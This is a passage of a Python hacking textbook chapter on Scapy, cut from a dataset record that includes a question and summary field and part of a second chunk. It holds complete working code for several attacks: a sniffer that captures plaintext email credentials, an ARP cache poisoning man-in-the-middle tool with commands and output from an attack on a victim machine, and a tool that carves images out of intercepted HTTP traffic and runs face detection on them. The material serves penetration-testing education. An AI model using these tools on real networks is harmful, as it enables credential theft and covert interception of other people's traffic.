packet\nmanipulation library Scapy. You just\nmight finish this chapter and realize we made you do\na lot of work in the previous two chapters to\naccomplish what you could have done with just one\nor two lines of Scapy.\nScapy is powerful and flexible, and its possibilities are almost\ninfinite. We’ll get a taste of things by sniffing traffic to steal plaintext\nemail credentials and then ARP poisoning a target machine on the\nnetwork so that we can sniff their traffic. We’ll wrap things up by\nextending Scapy’s pcap processing to carve out images from HTTP\ntraffic and then perform facial detection on them to determine if there\nare humans present in the images.\nWe recommend that you use Scapy under a Linux system, as it\nwas designed to work with Linux in mind. The newest version of\nScapy does support Windows, but for the purpose of this chapter we\nwill assume you are using your Kali virtual machine (VM) with a fully\nfunctioning Scapy installation. If you don’t have Scapy, head on over\nto https://scapy.net/ to install it.\nNow, suppose you have infiltrated a target’s local area network\n(LAN). You can sniff the traffic on the local network with the\ntechniques you’ll learn in this chapter.\nStealing Email Credentials\nYou’ve already spent some time getting into the nuts and bolts of\nsniffing in Python. Let’s get to know Scapy’s interface for sniffing\npackets and dissecting their contents. We’ll build a very simple\nsniffer to capture Simple Mail Transport Protocol (SMTP), Post Office\nProtocol (POP3), and Internet Message Access Protocol (IMAP)\ncredentials. Later, by coupling the sniffer with the Address\nResolution Protocol (ARP) poisoning man-in-the-middle (MITM)\nattack, we can easily steal credentials from other machines on the\nnetwork. This technique can, of course, be applied to any protocol,\nor to simply suck in all traffic and store it in a pcap file for analysis,\nwhich we will also demonstrate.\nTo get a feel for Scapy, let’s start by building a skeleton sniffer that\nsimply dissects and dumps out the packets. The aptly named\nsniff\nfunction looks like the following:\nsniff(filter=\"\",iface=\"any\",prn=function,count=N)\nThe parameter allows us to specify a Berkeley Packet Filter\nfilter\n(BPF) filter to the packets that Scapy sniffs, which can be left blank\nto sniff all packets. For example, to sniff all HTTP packets, you would\nuse a BPF filter of . The parameter tells the sniffer\ntcp port 80 iface\nwhich network interface to sniff on; if it is left blank, Scapy will sniff\non all interfaces. The parameter specifies a callback function to\nprn\nbe called for every packet that matches the filter, and the callback\nfunction receives the packet object as its single parameter. The\nparameter specifies how many packets you want to sniff; if it is\ncount\nleft blank, Scapy will sniff indefinitely.\nLet’s start by creating a simple sniffer that sniffs a packet and\ndumps its contents. We’ll then expand it to sniff only email-related\ncommands. Crack open mail_sniffer.py and jam out the following\ncode:\nfrom scapy.all import sniff\n1\ndef packet_callback(packet):\nprint(packet.show())\ndef main():\n2\nsniff(prn=packet_callback, count=1)\nif __name__ == '__main__':\nmain()\nWe start by defining the callback function that will receive each\nsniffed packet 1 and then simply tell Scapy to start sniffing 2 on all\ninterfaces with no filtering. Now let’s run the script, and you should\nsee output similar to the following:\n$ (bhp) tim@kali:~/bhp/bhp$ sudo python mail_sniffer.py\n###[ Ethernet ]###\ndst = 42:26:19:1a:31:64\nsrc = 00:0c:29:39:46:7e\ntype = IPv6\n###[ IPv6 ]###\nversion = 6\ntc = 0\nfl = 661536\nplen = 51\nnh = UDP\nhlim = 255\nsrc = fe80::20c:29ff:fe39:467e\ndst = fe80::1079:9d3f:d4a8:defb\n###[ UDP ]###\nsport = 42638\ndport = domain\nlen = 51\nchksum = 0xcf66\n###[ DNS ]###\nid = 22299\nqr = 0\nopcode = QUERY\naa = 0\ntc = 0\nrd = 1\nra = 0\nz = 0\nad = 0\ncd = 0\nrcode = ok\nqdcount = 1\nancount = 0\nnscount = 0\narcount = 0\n\\qd \\\n|###[ DNS Question Record ]###\n| qname = 'vortex.data.microsoft.com.'\n| qtype = A\n| qclass = IN\nan = None\nns = None\nar = None\nHow incredibly easy was that! We can see that when the first\npacket was received on the network, the callback function used the\nbuilt-in function to display the packet contents and\npacket.show\ndissect some of the protocol information. Using is a great way\nshow\nto debug scripts as you are going along to make sure you are\ncapturing the output you want.\nNow that we have the basic sniffer running, let’s apply a filter and\nadd some logic to the callback function to peel out email-related\nauthentication strings.\nIn the following example we’ll use a packet filter so that the sniffer\ndisplays only the packets we’re interested in. We’ll use BPF syntax,\nalso called Wireshark style, to do so. You’ll encounter this syntax\nwith tools like tcpdump, as well as in the packet capture filters used\nwith Wireshark.\nLet’s cover the basic syntax of the BPF filter. There are three types\nof information you can use in your filter. You can specify a descriptor\n(like a specific host, interface, or port), the direction of traffic flow,\nand the protocol, as shown in Table 4-1. You can include or omit the\ntype, direction, and protocol, depending on what you want to see in\nthe sniffed packets.\nTable 4-1: BPF Filter Syntax\nExpression Description Sample filter keywords\nDescriptor What you are looking for host, net, port\nDirection Direction of travel src, dst, src or dst\nProtocol Protocol used to send traffic ip, ip6, tcp, udp\nFor example, the expression specifies a filter\nsrc 192.168.1.100\nthat captures only packets originating on machine 192.168.1.100.\nThe opposite filter is , which captures only packets\ndst 192.168.1.100\nwith a destination of 192.168.1.100. Likewise, the expression\ntcp\nspecifies a filter that will pass only TCP\nport 110 or tcp port 25\npackets coming from or going to port 110 or 25. Now let’s write a\nspecific sniffer using BPF syntax in our example:\nfrom scapy.all import sniff, TCP, IP\n# the packet callback\ndef packet_callback(packet):\n1\nif packet[TCP].payload:\nmypacket = str(packet[TCP].payload)\n2\nif 'user' in mypacket.lower() or 'pass' in\nmypacket.lower():\nprint(f\"[*] Destination: {packet[IP].dst}\")\n3\nprint(f\"[*] {str(packet[TCP].payload)}\")\ndef main():\n# fire up the sniffer\n4\nsniff(filter='tcp port 110 or tcp port 25 or tcp port\n143',\nprn=packet_callback, store=0)\nif __name__ == '__main__':\nmain()\nPretty straightforward stuff here. We changed the function to\nsniff\nadd a BPF filter that includes only traffic destined for the common\nmail ports 110 (POP3), 143 (IMAP), and 25 (SMTP) 4. We also used\na new parameter called , which, when set to 0, ensures that\nstore\nScapy isn’t keeping the packets in memory. It’s a good idea to use\nthis parameter if you intend to leave a long-term sniffer running,\nbecause then you won’t be consuming vast amounts of RAM. When\nthe callback function is called, we check to make sure it has a data\npayload 1 and whether the payload contains the typical or\nUSER PASS\nmail command 2. If we detect an authentication string, we print out\nthe server we are sending it to and the actual data bytes of the\npacket 3.\nKicking the Tires\nHere is some sample output from a dummy email account the\nauthors attempted to connect a mail client to:\n(bhp) root@kali:/home/tim/bhp/bhp# python mail_sniffer.py\n[*] Destination: 192.168.1.207\n[*] b'USER tim\\n'\n[*] Destination: 192.168.1.207\n[*] b'PASS 1234567\\n'\nYou can see that our mail client is attempting to log in to the server\nat 192.168.1.207 and send the plaintext credentials over the wire.\nThis is a really simple example of how you can take a Scapy sniffing\nscript and turn it into a useful tool during penetration tests. The script\nworks for mail traffic because we designed the BPF filter to focus on\nthe mail-related ports. You can change that filter to monitor other\ntraffic; for example, change it to to watch for FTP\ntcp port 21\nconnections and credentials.\nSniffing your own traffic might be fun, but it’s always better to sniff\nwith a friend; let’s take a look at how you can perform an ARP\npoisoning attack to sniff the traffic of a target machine on the same\nnetwork.\nARP Cache Poisoning with Scapy\nARP poisoning is one of the oldest yet most effective tricks in a\nhacker’s toolkit. Quite simply, we will convince a target machine that\nwe have become its gateway, and we will also convince the gateway\nthat in order to reach the target machine, all traffic has to go through\nus. Every computer on a network maintains an ARP cache that\nstores the most recent media access control (MAC) addresses\nmatching the IP addresses on the local network. We’ll poison this\ncache with entries that we control to achieve this attack. Because the\nAddress Resolution Protocol, and ARP poisoning in general, is\ncovered in numerous other materials, we’ll leave it to you to do any\nnecessary research to understand how this attack works at a lower\nlevel.\nNow that we know what we need to do, let’s put it into practice.\nWhen the authors tested this, we attacked a real Mac machine from\na Kali VM. We have also tested this code against various mobile\ndevices connected to a wireless access point, and it worked great.\nThe first thing we’ll do is check the ARP cache on the target Mac\nmachine so we can see the attack in action later on. Examine the\nfollowing to see how to inspect the ARP cache on your Mac:\nMacBook-Pro:~ victim$ ifconfig en0\nen0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST>\nmtu 1500\nether 38:f9:d3:63:5c:48\ninet6 fe80::4bc:91d7:29ee:51d8%en0 prefixlen 64 secured\nscopeid 0x6\ninet 192.168.1.193 netmask 0xffffff00 broadcast 192.168.1.255\ninet6 2600:1700:c1a0:6ee0:1844:8b1c:7fe0:79c8 prefixlen 64\nautoconf secured\ninet6 2600:1700:c1a0:6ee0:fc47:7c52:affd:f1f6 prefixlen 64\nautoconf temporary\ninet6 2600:1700:c1a0:6ee0::31 prefixlen 64 dynamic\nnd6 options=201<PERFORMNUD,DAD>\nmedia: autoselect\nstatus: active\nThe command displays the network configuration for the\nifconfig\nspecified interface (here, it’s ) or for all interfaces if you don’t\nen0\nspecify one. The output shows that the (IPv4) address for the\ninet\ndevice is . Also listed are the MAC address\n192.168.1.193\n( , labeled as ) and a few IPv6 addresses.\n38:f9:d3:63:5c:48 ether\nARP poisoning works only for IPv4 addresses, so we’ll ignore the\nIPv6 ones.\nNow let’s see what the Mac has in its ARP address cache. The\nfollowing shows what it thinks the MAC addresses are for its\nneighbors on the network:\nMacBook-Pro:~ victim$ arp -a\n1\nkali.attlocal.net (192.168.1.203) at a4:5e:60:ee:17:5d on en0\nifscope\n2\ndsldevice.attlocal.net (192.168.1.254) at 20:e5:64:c0:76:d0 on\nen0 ifscope\n? (192.168.1.255) at ff:ff:ff:ff:ff:ff on en0 ifscope\n[ethernet]\nWe can see that the IP address of the Kali machine belonging to\nthe attacker 1 is and its MAC address is\n192.168.1.203\n. The gateway connects both attacker and victim\na4:5e:60:ee:17:5d\nmachines to the internet. Its IP address 2 is at and its\n192.168.1.254\nassociated ARP cache entry has a MAC address of\n. We will take note of these values because we\n20:e5:64:c0:76:d0\ncan view the ARP cache while the attack is occurring and see that\nwe have changed the gateway’s registered MAC address. Now that\nwe know the gateway and the target IP address, let’s begin coding\nthe ARP poisoning script. Open a new Python file, call it arper.py,\nand enter the following code. We’ll start by stubbing out the skeleton\nof the file to give you a sense of how we’ll construct the poisoner:\nfrom multiprocessing import Process\nfrom scapy.all import (ARP, Ether, conf, get_if_hwaddr,\nsend, sniff, sndrcv, srp, wrpcap)\nimport os\nimport sys\nimport time\n1\ndef get_mac(targetip):\npass\nclass Arper:\ndef __init__(self, victim, gateway, interface='en0'):\npass\ndef run(self):\npass\n2\ndef poison(self):\npass\n3\ndef sniff(self, count=200):\npass\n4\ndef restore(self):\npass\nif __name__ == '__main__':\n(victim, gateway, interface) = (sys.argv[1], sys.argv[2],\nsys.argv[3])\nmyarp = Arper(victim, gateway, interface)\nmyarp.run()\nAs you can see, we’ll define a helper function to get the MAC\naddress for any given machine 1 and an class to 2,\nArper poison\n3, and 4 the network settings. Let’s fill out each section,\nsniff restore\nstarting with the function, which returns a MAC address for a\nget_mac\ngiven IP address. We need the MAC addresses of the victim and the\ngateway.\ndef get_mac(targetip):\n1\npacket = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=\"who-has\",\npdst=targetip)\n2\nresp, _ = srp(packet, timeout=2, retry=10, verbose=False)\nfor _, r in resp:\nreturn r[Ether].src\nreturn None\nWe pass in the target IP address and create a packet 1. The\nEther\nfunction specifies that this packet is to be broadcast, and the\nARP\nfunction specifies the request for the MAC address, asking each\nnode whether it has the target IP. We send the packet with the Scapy\nfunction 2, which sends and receives a packet on network layer\nsrp\n2. We get the answer in the variable, which should contain the\nresp\nEther layer source (the MAC address) for the target IP.\nNext, let’s begin writing the class:\nArper\nclass Arper():\n1\ndef __init__(self, victim, gateway, interface='en0'):\nself.victim = victim\nself.victimmac = get_mac(victim)\nself.gateway = gateway\nself.gatewaymac = get_mac(gateway)\nself.interface = interface\nconf.iface = interface\nconf.verb = 0\n2\nprint(f'Initialized {interface}:')\nprint(f'Gateway ({gateway}) is at\n{self.gatewaymac}.')\nprint(f'Victim ({victim}) is at {self.victimmac}.')\nprint('-'*30)\nWe initialize the class with the victim and gateway IPs and specify\nthe interface to use ( is the default) 1. With this info, we populate\nen0\nthe object variables , , , , and\ninterface victim victimmac gateway\n, printing the values to the console 2.\ngatewaymac\nWithin the class we write the function, which is the entry\nArper run\npoint for the attack:\ndef run(self):\n1\nself.poison_thread = Process(target=self.poison)\nself.poison_thread.start()\n2\nself.sniff_thread = Process(target=self.sniff)\nself.sniff_thread.start()\nThe method performs the main work of the object. It sets\nrun Arper\nup and runs two processes: one to poison the ARP cache 1 and\nanother so we can watch the attack in progress by sniffing the\nnetwork traffic 2.\nThe method creates the poisoned packets and sends them\npoison\nto the victim and the gateway:\ndef poison(self):\n1\npoison_victim = ARP()\npoison_victim.op = 2\npoison_victim.psrc = self.gateway\npoison_victim.pdst = self.victim\npoison_victim.hwdst = self.victimmac\nprint(f'ip src: {poison_victim.psrc}')\nprint(f'ip dst: {poison_victim.pdst}')\nprint(f'mac dst: {poison_victim.hwdst}')\nprint(f'mac src: {poison_victim.hwsrc}')\nprint(poison_victim.summary())\nprint('-'*30)\n2\npoison_gateway = ARP()\npoison_gateway.op = 2\npoison_gateway.psrc = self.victim\npoison_gateway.pdst = self.gateway\npoison_gateway.hwdst = self.gatewaymac\nprint(f'ip src: {poison_gateway.psrc}')\nprint(f'ip dst: {poison_gateway.pdst}')\nprint(f'mac dst: {poison_gateway.hwdst}')\nprint(f'mac_src: {poison_gateway.hwsrc}')\nprint(poison_gateway.summary())\nprint('-'*30)\nprint(f'Beginning the ARP poison. [CTRL-C to stop]')\n3\nwhile True:\nsys.stdout.write('.')\nsys.stdout.flush()\ntry:\nsend(poison_victim)\nsend(poison_gateway)\n4\nexcept KeyboardInterrupt:\nself.restore()\nsys.exit()\nelse:\ntime.sleep(2)\nThe method sets up the data we’ll use to poison the victim\npoison\nand the gateway. First, we create a poisoned ARP packet intended\nfor the victim 1. Likewise, we create a poisoned ARP packet for the\ngateway 2. We poison the gateway by sending it the victim’s IP\naddress but the attacker’s MAC address. Likewise, we poison the\nvictim by sending it the gateway’s IP address but the attacker’s MAC\naddress. We print all of this information to the console so we can be\nsure of our packets’ destinations and payloads.\nNext, we start sending the poisoned packets to their destinations\nin an infinite loop to make sure that the respective ARP cache\nentries remain poisoned for the duration of the attack 3. The loop will\ncontinue until you press CTRL-C ( ) 4, in which\nKeyboardInterrupt\ncase we restore things to normal (by sending the correct information\nto the victim and the gateway, undoing our poisoning attack).\nIn order to see and record the attack as it happens, we sniff the\nnetwork traffic with the method:\nsniff\ndef sniff(self, count=100):\n1\ntime.sleep(5)\nprint(f'Sniffing {count} packets')\n2\nbpf_filter = \"ip host %s\" % victim\n3\npackets = sniff(count=count, filter=bpf_filter,\niface=self.interface)\n4\nwrpcap('arper.pcap', packets)\nprint('Got the packets')\n5\nself.restore()\nself.poison_thread.terminate()\nprint('Finished.')\nThe method sleeps for five seconds 1 before it starts sniffing\nsniff\nin order to give the poisoning thread time to start working. It sniffs for\na number of packets (100 by default) 3, filtering for packets that have\nthe victim’s IP 2. Once we’ve captured the packets, we write them to\na file called arper.pcap4, restore the ARP tables to their original\nvalues 5, and terminate the poison thread.\nFinally, the method puts the victim and gateway machines\nrestore\nback to their original state by sending correct ARP information to\neach machine:\ndef restore(self):\nprint('Restoring ARP tables...')\n1\nsend(ARP(\nop=2,\npsrc=self.gateway,\nhwsrc=self.gatewaymac,\npdst=self.victim,\nhwdst='ff:ff:ff:ff:ff:ff'),\ncount=5)\n2\nsend(ARP(\nop=2,\npsrc=self.victim,\nhwsrc=self.victimmac,\npdst=self.gateway,\nhwdst='ff:ff:ff:ff:ff:ff'),\ncount=5)\nThe method could be called from either the method\nrestore poison\n(if you hit CTRL-C) or the method (when the specified number\nsniff\nof packets have been captured). It sends the original values for the\ngateway IP and MAC addresses to the victim 1, and it sends the\noriginal values for the victim’s IP and MAC to the gateway 2.\nLet’s take this bad boy for a spin!\nKicking the Tires\nBefore we begin, we need to first tell the local host machine that we\ncan forward packets along to both the gateway and the target IP\naddress. If you are on your Kali VM, enter the following command\ninto your terminal:\n#:> echo 1 > /proc/sys/net/ipv4/ip_forward\nIf you are an Apple fanatic, use the following command:\n#:> sudo sysctl -w net.inet.ip.forwarding=1\nNow that we have IP forwarding in place, let’s fire up the script and\ncheck the ARP cache of the target machine. From your attacking\nmachine, run the following (as root):\n#:> python arper.py 192.168.1.193 192.168.1.254 en0\nInitialized en0:\nGateway (192.168.1.254) is at 20:e5:64:c0:76:d0.\nVictim (192.168.1.193) is at 38:f9:d3:63:5c:48.\n------------------------------\nip src: 192.168.1.254\nip dst: 192.168.1.193\nmac dst: 38:f9:d3:63:5c:48\nmac src: a4:5e:60:ee:17:5d\nARP is at a4:5e:60:ee:17:5d says 192.168.1.254\n------------------------------\nip src: 192.168.1.193\nip dst: 192.168.1.254\nmac dst: 20:e5:64:c0:76:d0\nmac_src: a4:5e:60:ee:17:5d\nARP is at a4:5e:60:ee:17:5d says 192.168.1.193\n------------------------------\nBeginning the ARP poison. [CTRL-C to stop]\n...Sniffing 100 packets\n......Got the packets\nRestoring ARP tables...\nFinished.\nAwesome! No errors or other weirdness. Now let’s validate the\nattack on the target machine. While the script was in the process of\ncapturing the 100 packets, we displayed the ARP table on the victim\ndevice with the command:\narp\nMacBook-Pro:~ victim$ arp -a\nkali.attlocal.net (192.168.1.203) at a4:5e:60:ee:17:5d on en0\nifscope\ndsldevice.attlocal.net (192.168.1.254) at a4:5e:60:ee:17:5d\non en0 ifscope\nYou can now see that the poor victim has a poisoned ARP cache,\nwhereas the gateway now has the same MAC address as the\nattacking computer. You can clearly see in the entry above the\ngateway that we’re attacking from . When the attack\n192.168.1.203\nhas finished capturing packets, you should see an arper.pcap file in\nthe same directory as your script. You can, of course, do things such\nas force the target computer to proxy all of its traffic through a local\ninstance of Burp or do any number of other nasty things. You might",
    "question": "What is the process for building a network sniffer that can discover active hosts on a network segment and decode both IP and ICMP headers using Python?",
    "summary": "Network sniffers allow you to monitor packets on a target machine, useful for both before and after exploitation. This text explains how to build a simple sniffer in Python, focusing on discovering active hosts using UDP and ICMP protocols, and decoding IP and ICMP headers. It also introduces Scapy, a powerful Python library for packet manipulation, and demonstrates how to use it for network traffic analysis, including ARP poisoning attacks to intercept communications. The guide provides code examples for both Windows and Linux, showing how to sniff and decode packets, and highlights the benefits of understanding low-level networking for developing more advanced tools."
  },
  {
    "start": 40,
    "end": 47,
    "text": "want to hang on to that pcap file for the next section on pcap\nprocessing—you never know what you might find!\npcap Processing\nWireshark and other tools like Network Miner are great for\ninteractively exploring packet capture files, but at times you’ll want to\nslice and dice pcap files using Python and Scapy. Some great use\ncases are generating fuzzing test cases based on captured network\ntraffic or even something as simple as replaying traffic that you have\npreviously captured.\nWe’ll take a slightly different spin on this and attempt to carve out\nimage files from HTTP traffic. With these image files in hand, we will\nuse OpenCV (http://www.opencv.org/), computer vision tool, to\nattempt to detect images that contain human faces so that we can\nnarrow down images that might be interesting. You can use the\nprevious ARP poisoning script to generate the pcap files, or you\ncould extend the ARP poisoning sniffer to do on-the-fly facial\ndetection of images while the target is browsing.\nThis example will perform two separate tasks: carving images out\nof HTTP traffic and detecting faces in those images. To\naccommodate this, we'll create two programs so that you can\nchoose to use them separately, depending on the task at hand. You\ncould also use the programs in sequence, as we’ll do here. The first\nprogram, recapper.py, analyzes a pcap file, locates any images that\nare present in the streams contained in the pcap file, and writes\nthose images to disk. The second program, detector.py, analyzes\neach of those image files to determine if it contains a face. If it does,\nit writes a new image to disk, adding a box around each face in the\nimage.\nLet’s get started by dropping in the code necessary to perform the\npcap analysis. In the following code, we’ll use a , a\nnamedtuple\nPython data structure with fields accessible by attribute lookup. A\nstandard tuple enables you to store a sequence of immutable values;\nthey’re almost like lists, except you can’t change a tuple’s value. The\nstandard tuple uses numerical indexes to access its members:\npoint = (1.1, 2.5)\nprint(point[0], point[1]\nA , on the other hand, behaves the same as a regular\nnamedtuple\ntuple except that it can access fields through their names. This\nmakes for much more readable code and is also more memory-\nefficient than a dictionary. The syntax to create a requires\nnamedtuple\ntwo arguments: the tuple’s name and a space-separated list of field\nnames. For example, say you want to create a data structure called\nwith two attributes: and . You’d define it as follows:\nPoint x y\nPoint = namedtuple('Point', ['x', 'y'])\nThen you could create a object named with the code\nPoint p p =\n, for example, and refer to its attributes just like those of\nPoint(35,65)\na class: and refer to the and attributes of a particular\np.x p.y x y\n. That is much easier to read than code referring to\nPointnamedtuple\nthe index of some item in a regular tuple. In our example, say you\ncreate a called with the following code:\nnamedtuple Response\nResponse = namedtuple('Response', ['header', 'payload'])\nNow, instead of referring to an index of a normal tuple, you can\nuse or , which is much easier to\nResponse.header Response.payload\nunderstand.\nLet’s use that information in this example. We’ll read a pcap file,\nreconstitute any images that were transferred, and write the images\nto disk. Open recapper.py and enter the following code:\nfrom scapy.all import TCP, rdpcap\nimport collections\nimport os\nimport re\nimport sys\nimport zlib\n1\nOUTDIR = '/root/Desktop/pictures'\nPCAPS = '/root/Downloads'\n2\nResponse = collections.namedtuple('Response', ['header',\n'payload'])\n3\ndef get_header(payload):\npass\n4\ndef extract_content(Response, content_name='image'):\npass\nclass Recapper:\ndef __init__(self, fname):\npass\n5\ndef get_responses(self):\npass\n6\ndef write(self, content_name):\npass\nif __name__ == '__main__':\npfile = os.path.join(PCAPS, 'pcap.pcap')\nrecapper = Recapper(pfile)\nrecapper.get_responses()\nrecapper.write('image')\nThis is the main skeleton logic of the entire script, and we’ll add in\nthe supporting functions shortly. We set up the imports and then\nspecify the location of the directory in which to output the images\nand the location of the pcap file to read 1. Then we define a\ncalled to have two attributes: the packet\nnamedtuple Response header\nand packet 2. We’ll create two helper functions to get the\npayload\npacket header 3 and extract the contents 4 that we’ll use with the\nclass we’ll define to reconstitute the images present in the\nRecapper\npacket stream. Besides , the class will have two\n__init__ Recapper\nmethods: , which will read responses from the pcap file\nget_responses\n5, and , which will write image files contained in the responses\nwrite\nto the output directory 6.\nLet’s start filling out this script by writing the function:\nget_header\ndef get_header(payload):\ntry:\n1\nheader_raw = payload[:payload.index(b'\\r\\n\\r\\n')+2]\nexcept ValueError:\nsys.stdout.write('-')\nsys.stdout.flush()\n2\nreturn None\nheader = dict(re.findall(r'(?P<name>.*?): (?\n3\nP<value>.*?)\\r\\n', header_raw.decode()))\n4\nif 'Content-Type' not in header:\nreturn None\nreturn header\nThe function takes the raw HTTP traffic and spits out\nget_header\nthe headers. We extract the header by looking for the portion of the\npayload that starts at the beginning and ends with a couple of\ncarriage return and newline pairs 1. If the payload doesn’t match that\npattern, we’ll get a , in which case we just write a dash ( )\nValueError -\nto the console and return 2. Otherwise, we create a dictionary\n( ) from the decoded payload, splitting on the colon so that the\nheader\nkey is the part before the colon and the value is the part after the\ncolon 3. If the header has no key called , we return\nContent-Type None\nto indicate that the header doesn’t contain the data we want to\nextract 4. Now let’s write a function to extract the content from the\nresponse:\ndef extract_content(Response, content_name='image'):\ncontent, content_type = None, None\n1\nif content_name in Response.header['Content-Type']:\n2\ncontent_type = Response.header['Content-\nType'].split('/')[1]\n3\ncontent =\nResponse.payload[Response.payload.index(b'\\r\\n\\r\\n')+4:]\n4\nif 'Content-Encoding' in Response.header:\nif Response.header['Content-Encoding'] == \"gzip\":\ncontent = zlib.decompress(Response.payload,\nzlib.MAX_WBITS | 32)\nelif Response.header['Content-Encoding'] ==\n\"deflate\":\ncontent = zlib.decompress(Response.payload)\n5\nreturn content, content_type\nThe function takes the HTTP response and the\nextract_content\nname for the content type we want to extract. Recall that is\nResponse\na with two parts: the header and the payload.\nnamedtuple\nIf the content has been encoded 4 with a tool like or ,\ngzip deflate\nwe decompress the content by using the module. For any\nzlib\nresponse that contains an image, the header will have the name\nin the attribute (for example, or\nimage Content-Type image/png\n) 1. When that occurs, we create a variable named\nimage/jpg\nwith the actual content type specified in the header 2.\ncontent_type\nWe create another variable to hold the content itself, which is\neverything in the payload after the header 3. Finally, we return a\ntuple of the and 5.\ncontent content_type\nWith those two helper functions complete, let’s fill out the\nRecapper\nmethods:\nclass Recapper:\n1\ndef __init__(self, fname):\npcap = rdpcap(fname)\n2\nself.sessions = pcap.sessions()\n3\nself.responses = list()\nFirst, we initialize the object with the name of the pcap file we want\nto read 1. We take advantage of a beautiful feature of Scapy to\nautomatically separate each TCP session 2 into a dictionary that\ncontains each complete TCP stream. Finally, we create an empty list\ncalled that we’re about to fill in with the responses from\nresponses\nthe pcap file 3.\nIn the method, we will traverse the packets to find\nget_responses\neach separate and add each one to the list of responses\nResponse\npresent in the packet stream:\ndef get_responses(self):\n1\nfor session in self.sessions:\npayload = b''\n2\nfor packet in self.sessions[session]:\ntry:\n3\nif packet[TCP].dport == 80 or\npacket[TCP].sport == 80:\npayload += bytes(packet[TCP].payload)\nexcept IndexError:\n4\nsys.stdout.write('x')\nsys.stdout.flush()\nif payload:\n5\nheader = get_header(payload)\nif header is None:\ncontinue\n6\nself.responses.append(Response(header=header,\npayload=payload))\nIn the method, we iterate over the\nget_responses sessions\ndictionary 1, then over the packets within each session 2. We filter\nthe traffic so we get only packets with a destination or source port of\n80 3. Then we concatenate the payload of all the traffic into a single\nbuffer called . This is effectively the same as right-clicking a\npayload\npacket in Wireshark and selecting Follow TCP Stream. If we don’t\nsucceed in appending to the payload variable (most likely because\nthere is no TCP in the packet), we print an to the console and keep\nx\ngoing 4.\nThen, after we’ve reassembled the HTTP data, if the byte\npayload\nstring is not empty, we pass it off to the HTTP header-parsing\nfunction 5, which enables us to inspect the HTTP headers\nget_header\nindividually. Next, we append the to the list 6.\nResponse responses\nFinally, we go through the list of responses and, if the response\ncontains an image, we write the image to disk with the method:\nwrite\ndef write(self, content_name):\n1\nfor i, response in enumerate(self.responses):\n2\ncontent, content_type = extract_content(response,\ncontent_name)\nif content and content_type:\nfname = os.path.join(OUTDIR, f'ex_{i}.\n{content_type}')\nprint(f'Writing {fname}')\nwith open(fname, 'wb') as f:\n3\nf.write(content)\nWith the extraction work complete, the method has only to\nwrite\niterate over the responses 1, extract the content 2, and write that\ncontent to a file 3. The file is created in the output directory with the\nnames formed by the counter from the built-in function and\nenumerate\nthe value. For example, a resulting image name might\ncontent_type\nbe ex_2.jpg. When we run the program, we create a object,\nRecapper\ncall its method to find all the responses in the pcap\nget_responses\nfile, and then write the extracted images from those responses to\ndisk.\nIn the next program, we’ll examine each image to determine\nwhether it contains a human face. For each image that has a face,\nwe’ll write a new image to disk, adding a box around the face in the\nimage. Open up a new file named detector.py:\nimport cv2\nimport os\nROOT = '/root/Desktop/pictures'\nFACES = '/root/Desktop/faces'\nTRAIN = '/root/Desktop/training'\ndef detect(srcdir=ROOT, tgtdir=FACES, train_dir=TRAIN):\nfor fname in os.listdir(srcdir):\n1\nif not fname.upper().endswith('.JPG'):\ncontinue\nfullname = os.path.join(srcdir, fname)\nnewname = os.path.join(tgtdir, fname)\n2\nimg = cv2.imread(fullname)\nif img is None:\ncontinue\ngray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\ntraining = os.path.join(train_dir,\n'haarcascade_frontalface_alt.xml')\n3\ncascade = cv2.CascadeClassifier(training)\nrects = cascade.detectMultiScale(gray, 1.3, 5)\ntry:\n4\nif rects.any():\nprint('Got a face')\n5\nrects[:, 2:] += rects[:, :2]\nexcept AttributeError:\nprint(f'No faces found in {fname}.')\ncontinue\n# highlight the faces in the image\nfor x1, y1, x2, y2 in rects:\n6\ncv2.rectangle(img, (x1, y1), (x2, y2), (127, 255,\n0), 2)\n7\ncv2.imwrite(newname, img)\nif name == '__main__':\ndetect()\nThe function receives the source directory, the target\ndetect\ndirectory, and the training directory as input. It iterates over the JPG\nfiles in the source directory. (Since we’re looking for faces, the\nimages are presumably photographs, so they’re most likely saved as\n.jpg files 1.) We then read the image by using the OpenCV computer\nvision library 2, load the detector XML file, and create the\ncv2 cv2\nface detector object 3. This detector is a classifier that is trained in\nadvance to detect faces in a front-facing orientation. OpenCV\ncontains classifiers for profile (sideways) face detection, hands, fruit,\nand a whole host of other objects that you can try out for yourself.\nFor images in which faces are found 4, the classifier will return the\ncoordinates of a rectangle that corresponds to where the face was\ndetected in the image. In that case, we print a message to the\nconsole, draw a green box around the face 6, and write the image to\nthe output directory 7.\nThe data returned from the detector are of the form\nrects (x, y,\n, where values provide the coordinates of the\nwidth, height) x, y\nlower-left corner of the rectangle, and values\nwidth, height\ncorrespond to the width and height of the rectangle.\nWe use Python slice syntax 5 to convert from one form to another.\nThat is, we convert the returned data to actual coordinates:\nrects\nor . This is the\n(x1, y1, x1+width, y1+height) (x1, y1, x2, y2)\ninput format the method is expecting.\ncv2.rectangle\nThis code was generously shared by Chris Fidao at\nhttp://www.fideloper.com/facial-detection/. This example made slight\nmodifications to the original. Now let’s take this all for a spin inside\nyour Kali VM.\nKicking the Tires\nIf you haven’t first installed the OpenCV libraries, run the following\ncommands (again, thank you, Chris Fidao) from a terminal in your\nKali VM:\n#:> apt-get install libopencv-dev python3-opencv python3-\nnumpy python3-scipy\nThis should install all of the necessary files needed to handle facial\ndetection on the resulting images. We also need to grab the facial\ndetection training file, like so:\n#:> wget\nhttp://eclecti.cc/files/2008/03/haarcascade_frontalface_alt.x\nml\nCopy the downloaded file to the directory we specified in the\nTRAIN\nvariable in detector.py. Now create a couple of directories for the\noutput, drop in a pcap, and run the scripts. This should look\nsomething like the following:\n#:> mkdir /root/Desktop/pictures\n#:> mkdir /root/Desktop/faces\n#:> python recapper.py\nExtracted: 189 images\nxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx----------\n----xx\nWriting pictures/ex_2.gif\nWriting pictures/ex_8.jpeg\nWriting pictures/ex_9.jpeg\nWriting pictures/ex_15.png\n...\n#:> python detector.py\nGot a face\nGot a face\n...\n#:>\nYou might see a number of error messages being produced by\nOpenCV because some of the images we fed into it may be corrupt\nor partially downloaded or their format might not be supported. (We’ll\nleave building a robust image extraction and validation routine as a\nhomework assignment for you.) If you crack open your faces\ndirectory, you should see several files with faces and magic green\nboxes drawn around them.\nThis technique can be used to determine what types of content\nyour target is looking at, 